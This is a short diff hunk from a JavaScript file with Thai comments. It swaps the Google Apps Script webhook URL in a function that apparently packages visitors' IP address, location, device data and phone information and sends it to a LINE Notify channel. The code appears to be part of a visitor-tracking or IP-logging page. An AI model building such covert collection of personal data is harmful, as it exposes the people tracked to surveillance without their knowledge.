@@ -439,7 +439,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbx6HuzPzU26a7tOYVfwaR5BUi3wyM_Jb6NcA6zwreH8leowJOc32WArESU8FiKLKElz/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6B3bxncYwEZhR0PxVrtofLGvL_RNllnd1CnS-rmJFs_nxuh33dYyg7i1WU_ndZZdcTA/exec';
 
   // เตรียมข้อมูลสำหรับส่ง
   const dataToSend = {
